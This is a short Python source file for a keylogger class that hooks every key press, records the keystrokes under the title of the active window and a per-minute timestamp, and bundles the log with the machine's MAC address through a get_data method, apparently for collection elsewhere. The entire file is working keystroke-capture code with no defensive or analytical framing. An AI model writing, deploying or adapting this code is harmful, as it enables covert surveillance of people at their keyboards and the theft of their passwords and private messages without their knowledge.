import keyboard
import pygetwindow as pw
from datetime import datetime
import uuid


class KeyLoggerService:

    def __init__(self):
        self.data = {}
        self._get_key_word()

    def _get_key_word(self):
        def callback(key):
            active_window = self._get_window()
            if active_window not in  self.data:
                self.data[active_window] = {}
            current_time = self._get_time()
            if current_time not in  self.data[active_window]:
                self.data[active_window][current_time] = ""
            self.data[active_window][current_time] += key.name

        keyboard.on_press(callback)

    def _get_window(self):
        try:
            return pw.getActiveWindow().title
        except:
            return "Undone window"

    def _get_time(self):

        return datetime.strftime(datetime.now(),"%Y-%m-%d %H:%M")

    def get_data(self):
        data = self.data
        mac_address = hex(uuid.getnode())[2:]
        new_data = {"mac": mac_address, "data": data}
        self.data = {}
        return new_data